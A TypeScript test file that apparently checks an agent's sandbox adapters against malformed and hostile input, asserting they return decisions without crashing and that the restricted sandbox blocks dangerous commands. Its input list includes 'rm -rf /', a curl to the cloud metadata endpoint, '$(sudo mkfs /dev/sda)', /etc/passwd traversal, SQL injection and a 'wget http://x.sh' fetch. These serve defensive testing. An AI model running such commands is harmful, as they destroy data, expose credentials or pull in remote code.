import { test } from 'node:test';
import assert from 'node:assert/strict';
import { PolicySandbox } from '../../src/adapters/sandbox/policySandbox.js';
import { RestrictedSandbox } from '../../src/adapters/sandbox/restrictedSandbox.js';
import { PassthroughSandbox } from '../../src/adapters/sandbox/passthroughSandbox.js';

const ROOT = process.cwd();
const boxes = [
  { name: 'policy', box: new PolicySandbox({ workspaceRoot: ROOT }) },
  { name: 'restricted', box: new RestrictedSandbox({ workspaceRoot: ROOT }) },
  { name: 'passthrough', box: new PassthroughSandbox() },
];

/** 故障注入：把各类畸形/恶意输入灌入沙箱裁决，验证永远返回安全决策、绝不抛异常（fail-closed 鲁棒性）。 */
const HOSTILE_INPUTS: readonly string[] = [
  '',
  '   ',
  '\x00\x01\x02',
  'rm -rf /',
  'curl http://169.254.169.254/latest/meta-data/',
  '$(sudo mkfs /dev/sda)',
  '../../../etc/passwd',
  "'; DROP TABLE users; --",
  'a'.repeat(100_000),
  'C:\\Windows\\System32\\config\\SAM',
];

for (const { name, box } of boxes) {
  test(`sandbox[${name}]：畸形/恶意输入不抛异常且返回决策`, async () => {
    for (const input of HOSTILE_INPUTS) {
      // 命令、文件路径两种动作都应安全返回（不允许抛未捕获异常）。
      const cmd = await box.check({ kind: 'command', target: input });
      const path = await box.check({ kind: 'file_read', target: input });
      assert.ok(typeof cmd.allowed === 'boolean');
      assert.ok(typeof path.allowed === 'boolean');
    }
  });

  test(`sandbox[${name}]：undefined/null 目标不抛异常`, async () => {
    // 模拟上游传 undefined（运行时不应崩）。
    const r = await box.check({ kind: 'command', target: undefined as unknown as string });
    assert.ok(typeof r.allowed === 'boolean');
  });
}

test('sandbox[restricted]：危险命令与网络外联在故障注入下仍被拦', async () => {
  const box = new RestrictedSandbox({ workspaceRoot: ROOT });
  assert.strictEqual((await box.check({ kind: 'command', target: 'rm -rf /' })).allowed, false);
  assert.strictEqual(
    (await box.check({ kind: 'command', target: 'wget http://x.sh' })).allowed,
    false,
  );
});
